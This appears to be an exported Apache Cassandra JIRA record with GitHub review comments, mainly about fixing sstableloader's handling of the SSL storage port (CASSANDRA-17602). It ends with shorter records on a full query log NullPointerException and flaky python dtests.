URL: https://github.com/apache/cassandra/pull/1632#discussion_r876689784


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   @driftx this code belongs to the test method `bulkLoaderCannotAgreeOnClientTLSProtocol` which specified `--ssl-protocol` to be `TLSv1` which is invalid as in config it is `TLSv1.2` for _client_ encryption. Bulkloader internally connects via CQL to a node, fetching metadata, getting token ranges and so on before actually loading sstables. So this exception comes from the fact that we have not been able to talk to that node via CQL because we have set invalid `--ssl-protocol` flag. Basically, it fails way sooner it gets to sstable loading and this test verifies that setting invalid ssl protocol to connect through fails and driver throws that exception.



;19/May/22 07:20;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876710490


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   What is puzzling is that when I checkout cassandra-4.0 as is now, without this patch applied, running this test in IDEA, locally, fails as well, huh. It is actually good question why do I need to suddenly change this assert to check if the log contains some other exception. Should be the same as it was before. But this test fails even as-is in cassandra-4.0.
   
   Would you do me a favor a run this test yourself locally on cassandra-4.0 to see if it passes there for you? Thanks a lot.



;19/May/22 07:37;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876710490


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   What is puzzling is that when I checkout cassandra-4.0 as is now, without this patch applied, running this test in IDEA, locally, fails as well, huh. It is actually good question why do I need to suddenly change this assert to check if the log contains some other exception. Should be the same as it was before. But this test fails even as-is in cassandra-4.0.
   
   Would you do me a favour and run this test yourself locally on cassandra-4.0 to see if it passes there for you? Thanks a lot.



;19/May/22 07:39;githubbot;600","driftx commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876917239


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   This fails for me too, both in isolation and in the suite.  It's a bit worrisome this doesn't appear in jenkins or circle



;19/May/22 11:00;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876926680


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   Thanks, interesting, I will try to poke around whats up.



;19/May/22 11:11;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876928780


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   I think that catching whatever exception we get from initialisation and wrapping it into ConfigurationException and throwing that one would do the job. At least we would be sure that it throws one exception type no matter what is the cause.



;19/May/22 11:14;githubbot;600","smiklosovic closed pull request #1632: CASSANDRA-17602 4.0 remove ssl storage port from sstableloader
URL: https://github.com/apache/cassandra/pull/1632


;13/Jun/22 19:17;githubbot;600","smiklosovic closed pull request #1682: CASSANDRA-17602 followup
URL: https://github.com/apache/cassandra/pull/1682


;17/Jun/22 07:24;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7800,,,0,7800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 27 18:01:06 UTC 2022,,,,,,,All,,,,"0|z123go:",9223372036854775807,,,,brandon.williams,jonmeredith,smiklosovic,,,,4.0.0,,https://github.com/apache/cassandra/commit/2531dd1ebaeab4e71f970e27a5dd962ceb6b790b,,,,,,,,,fixed unit tests,,,,,"05/May/22 14:10;brandon.williams;/cc [~stefan.miklosovic];;;","05/May/22 14:53;smiklosovic;Interesting, that somehow reminds me https://issues.apache.org/jira/browse/CASSANDRA-17210

I think it will be matter of reshuffling the order how these things are parsed or something similar.;;;","05/May/22 21:26;aswinkarthik;I suspect the default config file gets loaded due to [this|https://github.com/apache/cassandra/blob/cassandra-4.0.1/src/java/org/apache/cassandra/tools/BulkLoader.java#L56] leading to [this|https://github.com/apache/cassandra/blob/6709111ed007a54b3e42884853f89cabd38e4316/src/java/org/apache/cassandra/config/DatabaseDescriptor.java#L216];;;","05/May/22 22:23;smiklosovic;[~aswinkarthik] could you please send this the exact command you are executing with ports and file flag on the command line, as well as the content of that file? (redacted values if it is security sensitive, of course).;;;","06/May/22 09:37;aswinkarthik;Cassandra version: *4.0.1*

*Does not work:*

The following scenario does not work in 4.x. I also do not overwrite the conf/cassandra.yaml
{noformat}
bin/sstableloader -d <seed_1_ip>:10052,<seed_2_ip>:10052,<seed_3_ip>:10052 -ts <path-to-ts> -tspw <tspassword> -ks <path-to-ks> -kspw <kspassword> -ap <ACustomAuthProviderClass> -p 10052 -sp 11052 -ssp 11052 -f /backuprestore-cassandra.yaml <dirpath>
{noformat}
 

contents of /backuprestore-cassandra.yaml
{noformat}
server_encryption_options:
    internode_encryption: all
    protocol: TLSv1.2
    algorithm: PKIX
    store_type: PKCS12
    cipher_suites:
        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    require_client_auth: true
    keystore: <path-to-ks>
    truststore: <path-to-ts>

client_encryption_options:
    enabled: true
    optional: false
    protocol: TLSv1.2
    algorithm: PKIX
    store_type: PKCS12
    cipher_suites:
        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384

stream_throughput_outbound_megabits_per_sec: 5000
{noformat}
And the contents conf/cassandra.yaml is just usual defaults.

The above setup works in 3.x provided I remove the ports from the seeds.

 

*What works in 4.x:*
{noformat}
cp /backuprestore-cassandra.yaml conf/cassandra.yaml
bin/sstableloader -d <seed_1_ip>:10052,<seed_2_ip>:10052,<seed_3_ip>:10052 -ts <path-to-ts> -tspw <tspassword> -ks <path-to-ks> -kspw <kspassword> -ap <ACustomAuthProviderClass> -p 10052 -sp 11052 -ssp 11052 -f /backuprestore-cassandra.yaml <dirpath>
{noformat}
And contents of /backuprestore-cassandra.yaml (or) conf/cassandra.yaml
{noformat}
server_encryption_options:
    internode_encryption: all
    protocol: TLSv1.2
    algorithm: PKIX
    store_type: PKCS12
    cipher_suites:
        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    require_client_auth: true
    keystore: <path-to-ks>
    truststore: <path-to-ts>

client_encryption_options:
    enabled: true
    optional: false
    protocol: TLSv1.2
    algorithm: PKIX
    store_type: PKCS12
    cipher_suites:
        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384

stream_throughput_outbound_megabits_per_sec: 5000
commitlog_sync: periodic
commitlog_sync_period_in_ms: 10000
partitioner: org.apache.cassandra.dht.Murmur3Partitioner
endpoint_snitch: GossipingPropertyFileSnitch
{noformat}
The last four configs also need to be added for this to work;;;","13/May/22 09:17;smiklosovic;[~aswinkarthik] I have added a test with all combinations I could think of and I can not replicate your issue, see here

https://github.com/instaclustr/cassandra/commit/9410f53ea75231e581f939cf863c34324b2b3ee0;;;","13/May/22 10:31;smiklosovic;I have also added one more test which mimmics the code executed in the tool itself here

https://github.com/instaclustr/cassandra/commit/6f2bdd1552af549babe55446d14a8fb970196961

(testing your idea with DatabaseDescriptor.toolInitialization());;;","13/May/22 11:59;smiklosovic;Ok I tried it manually and I replicated it. ;;;","13/May/22 12:43;smiklosovic;This is interesting problem. So, there is an option introduced in 4.x in server_encryption_options called ""enable_legacy_ssl_storage_port"" which is by default false.

If I set enable_legacy_ssl_storage_port to true and I configure storage_port and ssl_storage_port in nodes's cassandra.yaml and I specify both sp and ssp and the command line, this example works ok.

If I change ssp to something else from what is in cassandra.yaml, it will not work, I see that it will use the changed ssp port in the exception but since it is not equal to ssl_storage_port in cassandra.yaml, it will fail.

However, if I set that enable_legacy_ssl_storage_port to false (which is default), then no matter what I set ssp to, it will not connect. It sees that you are trying to connect via ssl, so it tries to talk via ssp you set, but since you have not enabled that legacy port, it will fail.

The workaround here is to set enable_legacy_ssl_storage_port to true in cassandra.yaml if you want to talk to it securely via ssp in loader.

I think this is a bug but not like what we were thinking initially it was. I think the solution is to be able to load sstables even legacy ssl port is not enabled and it should then talk via normal storage port but it is not happening.;;;","13/May/22 14:45;brandon.williams;I agree that should be the solution, using the normal storage port.  This was probably overlooked when that changed.;;;","16/May/22 09:45;smiklosovic;We should then get rid of ssp flag and all the related logic. I ll try that approach.;;;","16/May/22 10:16;brandon.williams;I think we'll still need it if enable_legacy_ssl_storage_port is used, no?;;;","16/May/22 12:17;smiklosovic;I still have a hard time to understand what is that enable_legacy_ssl_storage_port good for exactly. cassandra.yaml says it is good for ""upgrades"" from 3.0 to 4.0 (it is as a comment there) but if we want to talk over one storage port only (eventually), what is that ssp port for then in context of sstableloader?;;;","16/May/22 12:25;brandon.williams;It adds another encrypted storage on ssl_storage_port, since nodes before 4.0 won't know about the storage port handling encrypted traffic.  So I think I was wrong and we don't need -ssp, and can just point -sp at whatever port is bound and we can negotiate it, but the devil is always in the details when you get to implementation.;;;","16/May/22 17:16;smiklosovic;Do we want to log some message that ssp is deprecated and effectively ignored and only sp is used? In other words, do we still want react on ssp flag but do nothing or we just error out as that option would not be recognized anymore?

We would need to get back to this in 4.0.6, 4.1.1 and 4.2 to get rid of that fully.

I would just remove it all right now - no ""transition"" / deprecation period.;;;","16/May/22 17:25;brandon.williams;bq. I would just remove it all right now - no ""transition"" / deprecation period.

I think that makes sense since it's no longer necessary in 4.0.;;;","17/May/22 15:19;smiklosovic;[https://github.com/apache/cassandra/pull/1632]

[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1710/]

branch and build is for 4.0, other branches / builds will be done upon merge, I would like to have a review first to agree with the approach first.;;;","17/May/22 18:24;smiklosovic;[~e.dimitrova]  I see you are watching this, would you mind to review? ;;;","17/May/22 23:50;e.dimitrova;Hey [~smiklosovic], I am on top of 4 tickets now and trying to deal with them until this  Friday as I will be off big part next week. I will probably not be available to look at this one before end of next week.

 ;;;","18/May/22 18:12;brandon.williams;The approach looks reasonable to me.;;;","26/May/22 20:28;smiklosovic;I debugged it more when it comes to the test issues we were discussing here (1).

I added printing of tool.getStdout() and tool.getStderr() into that test to see what it contains.

stdout
||Exception||IDEA||Jenkins logs||
|SSLHandshakeException|no|yes|
|TransportException|yes|yes|

stderr
||Exception||IDEA||Jenkins logs||
|SSLHandshakeException|no|no|
|TransportException|yes|yes|

Right now, the current upstream code checks SSLHandshakeException on stdout. This makes the test passing in Jenkins but not in IDEA. The common case for both environment is TransportException in either stdout or stderr. I would change it to check TransportException in stdout (currently the check is done on stdout too).

Honestly, I do not have any idea where this difference comes from.

(1) [https://github.com/apache/cassandra/pull/1632#discussion_r876199710];;;","01/Jun/22 07:49;smiklosovic;[~brandon.williams] [~e.dimitrova] I rewrote the patch, I am catching all exceptions which may happen in init method in loader and I am reacting in the tests accordingly. So now it does not matter what environment we are testing it in and exception handling in the code is more solid. Would you please take a second look? 

[https://github.com/apache/cassandra/pull/1632/files]
[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1745/]
[https://app.circleci.com/pipelines/github/instaclustr/cassandra?branch=CASSANDRA-17602];;;","08/Jun/22 10:43;smiklosovic;[~brandon.williams] pinging again based on your comments as you might be potential reviewer :) , [~e.dimitrova] is vacationing atm ...;;;","08/Jun/22 18:11;brandon.williams;LGTM, +1.;;;","13/Jun/22 11:03;smiklosovic;trunk https://app.circleci.com/pipelines/github/instaclustr/cassandra?branch=CASSANDRA-17602-trunk
4.1 https://app.circleci.com/pipelines/github/instaclustr/cassandra?branch=CASSANDRA-17602-4.1
4.0 https://app.circleci.com/pipelines/github/instaclustr/cassandra?branch=CASSANDRA-17602;;;","13/Jun/22 22:28;e.dimitrova;I apologize I am out these days and I didn’t manage to review this one before commit.

Jon just brought it on another ticket. Unfortunately, it is a breaking change and  in a minor release and we cannot afford that.

Please revert it until another patch to fix the issue without breaking changes lands.

I can help reviewing next week when I am back if there is still a need. ;;;","13/Jun/22 22:58;e.dimitrova;To be more clear - my understanding is the config needs to be deprecated and the users informed but we shouldn’t remove it, similar to what we agreed and do for the Config class. Thanks;;;","14/Jun/22 07:15;smiklosovic;Huh, I dont get it, this is not yaml.

I was explicitly asking this:

I would just remove it all right now - no ""transition"" / deprecation period.

Brandon said:

I think that makes sense since it's no longer necessary in 4.0.

If we ever want to ""deprecate it"" (which does not make sense because it should not be there in the first place at all), I am against reverting this - what I can do is to create new patch which would re-introduce this flag and it would do basically nothing - it would just alias to storage port internally. However that does not make sense either because once we have to just remove it. What do you mean by ""informing the users""? Mentioning it in NEWS.txt ? 

EDIT:

After having offline discussion with [~e.dimitrova] the course of action here should be that we re-introduce the removed flag but it will do nothing and we log / inform the user that it is deprecated and all is going through ""normal"" storage port.

What I am missing is to what exact versions we should reintroduce this flag into and what version we should remove it in.;;;","14/Jun/22 09:06;smiklosovic;This is my take on it: https://github.com/apache/cassandra/pull/1682

I am just returning that flag back and just logging it. All will go through normal storage port.

This should be applied to 4.1 and trunk too.

[~jmeredithco] do you want to review? I think Ekaterina was mentioning you spot this issue.;;;","14/Jun/22 17:45;jonmeredith;+1 thanks for making it backward compatible.;;;","16/Jun/22 16:09;smiklosovic; 

4.0 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1083/workflows/32b8fb78-f001-4fcf-8f87-bd3bdf7c926f]

4.1 [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1797/]

trunk [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1795/testReport/];;;","16/Jun/22 17:49;smiklosovic;commit which returns the flag and deprecates it is here:

 

https://github.com/apache/cassandra/commit/7da28ef37848d14c0ff4597dfc6e116bd9febce6;;;","27/Jun/22 16:18;jmckenzie;[CI Results]
Branch: 4.1, build number: 67
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/67/
   JIRA: CASSANDRA-17602
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=2531dd1ebaeab4e71f970e27a5dd962ceb6b790b
   affected paths:
* src/java/org/apache/cassandra/tools/LoaderOptions.java
* src/java/org/apache/cassandra/utils/NativeSSTableLoaderClient.java
* src/java/org/apache/cassandra/tools/BulkLoader.java
* test/unit/org/apache/cassandra/tools/BulkLoaderTest.java
* CHANGES.txt
* test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java
* src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java

   Build Result: UNSTABLE
   Passing Tests: 47406
   Failing Tests: 8

||Test|Failures|JIRA||
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome|8 of 64|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewComplexTTLTest.terminated successfully|4 of 64|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|6 of 64|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV3XTest.testAvailability|10 of 64|[CASSANDRA-17310?|https://issues.apache.org/jira/browse/CASSANDRA-17310]|
|org.apache.cassandra.db.monitoring.MonitoringTaskTest.testMultipleThreadsSameNameSlow|1 of 64|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnClusteringKeyInsertExpiringColumn|3 of 64|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|15 of 64|[CASSANDRA-17651?|https://issues.apache.org/jira/browse/CASSANDRA-17651]|
|org.apache.cassandra.distributed.upgrade.CompactStoragePagingTest.testPagingWithCompactStorage|3 of 64|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252];;;","27/Jun/22 18:01;smiklosovic;I do not see anything which would be related to this ticket.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
nodetool enablefullquerylog can NPE when directory has no files,CASSANDRA-17595,13443025,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,03/May/22 20:38,01/Oct/22 17:27,13/Jul/23 08:40,04/May/22 16:36,4.1,4.1-alpha1,,,,,Tool/fql,,,,0,,"fqltool_test.py::TestFQLTool::test_unclean_enable found an issue with org.apache.cassandra.utils.binlog.BinLog#deleteRecursively, it assumes listing files returns empty list rather than null and throws a NPE

{code}
E           -- StackTrace --
E           java.lang.NullPointerException
E           	at org.apache.cassandra.utils.binlog.BinLog.deleteRecursively(BinLog.java:490)
E           	at org.apache.cassandra.utils.binlog.BinLog.cleanDirectory(BinLog.java:477)
E           	at org.apache.cassandra.utils.binlog.BinLog$Builder.build(BinLog.java:436)
E           	at org.apache.cassandra.fql.FullQueryLogger.enable(FullQueryLogger.java:106)
E           	at org.apache.cassandra.service.StorageService.enableFullQueryLogger(StorageService.java:6495)
E           	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
E           	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
E           	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
E           	at java.lang.reflect.Method.invoke(Method.java:498)
E           	at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:72)
E           	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
E           	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
E           	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
E           	at java.lang.reflect.Method.invoke(Method.java:498)
E           	at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:276)
E           	at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:112)
E           	at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:46)
E           	at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.java:237)
E           	at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:138)
E           	at com.sun.jmx.mbeanserver.MBeanSupport.invoke(MBeanSupport.java:252)
E           	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:819)
E           	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:801)
E           	at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1468)
E           	at javax.management.remote.rmi.RMIConnectionImpl.access$300(RMIConnectionImpl.java:76)
E           	at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1309)
E           	at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1401)
E           	at javax.management.remote.rmi.RMIConnectionImpl.invoke(RMIConnectionImpl.java:829)
{code}",,dcapwell,jonmeredith,smiklosovic,,,,,,,,,,,,"smiklosovic closed pull request #1601: CASSANDRA-17595 nodetool enablefullquerylog can NPE when directory has no files
URL: https://github.com/apache/cassandra/pull/1601


;09/May/22 10:17;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat Oct 01 17:27:39 UTC 2022,,,,,,,All,,,,"0|z12194:",9223372036854775807,,,,jmeredithco,,,,Critical,,NA,,https://github.com/apache/cassandra/commit/559b17f71d3207158d34b1dd2414a531e362af20,,,,,,,,,existing tests,,,,,"03/May/22 21:29;jonmeredith;+1;;;","03/May/22 22:07;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17595-cassandra-4.1-0099BC8C-594E-4D5C-A02A-7AC27EBCEC4C]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17595-cassandra-4.1-0099BC8C-594E-4D5C-A02A-7AC27EBCEC4C]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1655/]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17595-trunk-0099BC8C-594E-4D5C-A02A-7AC27EBCEC4C]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17595-trunk-0099BC8C-594E-4D5C-A02A-7AC27EBCEC4C]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1656/]|
;;;","04/May/22 16:31;dcapwell;a few python-dtest tests failed to bind, but they passed under the other configs...;;;","01/Oct/22 17:27;smiklosovic;I am just wondering why this was not patched for 4.0 as well? I am fixing some stuff in CASSANDRA-17933, do you mind if I back port this? [~dcapwell]  [~jonmeredith] ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky python-tests due to connection getting closed,CASSANDRA-17594,13443015,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,03/May/22 18:48,02/Jun/22 15:22,13/Jul/23 08:40,01/Jun/22 17:57,NA,,,,,,Test/dtest/python,,,,0,,"We log unknown exceptions at the networking level, which includes case where the remote side closes the connection (such as the cases caused by shutting down), depending on how quickly the instances shutdown, this could cause python-dtest to fail for random tests with a message such as

{code}
Unexpected error found in node logs (see stdout for full details). Errors: [WARN  [epollEventLoopGroup-5-9] 2022-05-03T16:47:03,800 ExceptionHandlers.java:134 - Unknown exception in client networking
io.netty.channel.unix.Errors$NativeIoException: writeAddress(..) failed: Connection reset by peer, WARN  [epollEventLoopGroup-5-9] 2022-05-03T16:47:03,800 ExceptionHandlers.java:134 - Unknown exception in client networking
io.netty.channel.unix.Errors$NativeIoException: writeAddress(..) failed: Connection reset by peer]
{code}",,dcapwell,e.dimitrova,jonmeredith,maedhroz,,,,,,,,,,,"dcapwell commented on code in PR #192:
URL: https://github.com/apache/cassandra-dtest/pull/192#discussion_r864152349


##########
dtest_setup.py:
##########
@@ -72,6 +77,13 @@ def __init__(self, dtest_config=None, setup_overrides=None, cluster_name=""test"")
         self.create_cluster_func = None
         self.iterations = 0
 
+    @ignore_log_patterns.setter

Review Comment:
   ```
       @ignore_log_patterns.setter
   NameError: name 'ignore_log_patterns' is not defined
   ```
   
   blah, python docs said this should work!  guess I need a getter... will try that



;03/May/22 19:56;githubbot;600","maedhroz commented on code in PR #192:
URL: https://github.com/apache/cassandra-dtest/pull/192#discussion_r864270189


##########
conftest.py:
##########
@@ -240,11 +241,8 @@ def check_logs_for_errors(dtest_setup):
                     error_str = error.strip()
 
                 if error_str:
-                    logger.error(""Unexpected error in {node_name} log, error: \n{error}""
-                                 .format(node_name=node.name, error=error_str))

Review Comment:
   Was this just creating unnecessary logging noise before?



;03/May/22 21:19;githubbot;600","dcapwell commented on code in PR #192:
URL: https://github.com/apache/cassandra-dtest/pull/192#discussion_r865134750


##########
conftest.py:
##########
@@ -240,11 +241,8 @@ def check_logs_for_errors(dtest_setup):
                     error_str = error.strip()
 
                 if error_str:
-                    logger.error(""Unexpected error in {node_name} log, error: \n{error}""
-                                 .format(node_name=node.name, error=error_str))

Review Comment:
   it was the only thing showing the node_name, so it was needed to know where the logs came from



;04/May/22 18:15;githubbot;600","dcapwell merged PR #192:
URL: https://github.com/apache/cassandra-dtest/pull/192


;04/May/22 22:13;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17626,CASSANDRA-17627,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 01 17:57:58 UTC 2022,,,,,,,All,,,,"0|z1216w:",9223372036854775807,,,,jmeredithco,maedhroz,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/be48c417e6bbbd7c58f43ed001c9a2209a6339ab,,,,,,,,,submitted CI against the branch,,,,,"03/May/22 18:49;dcapwell;will linke CI after lunch;;;","03/May/22 19:46;e.dimitrova;You might want to rebase before submitting it :) Mick just made final CI changes after the branching so things should be fine now but... please, rebase :) ;;;","03/May/22 19:52;dcapwell;thanks, rebased and kicked off CI;;;","03/May/22 23:17;dcapwell;this patch seems to cause some repair tests to fail, so will look closer into that (juggling things, so will do tomorrow);;;","04/May/22 18:35;dcapwell;fun, if I revert conftest.py I see it logs that there were errors in the log, but the test is marked as success... so by fixing conftest.py I now cause the tests to fail !

yay?

{code}
18:39:33,839 repair_tests.repair_test DEBUG Killed node3, now waiting repair to finish
PASSED                                                                                                                                                                                                   [100%]
---------------------------------------------------------------------------------------------- live log teardown -----------------------------------------------------------------------------------------------
18:39:33,859 conftest ERROR Unexpected error in node1 log, error:
'ERROR [Repair#1:1] 2022-05-04 18:39:20,930 JVMStabilityInspector.java:68 - Exception in thread Thread[Repair#1:1,5,Repair#1]\norg.apache.cassandra.repair.SomeRepairFailedException: null'


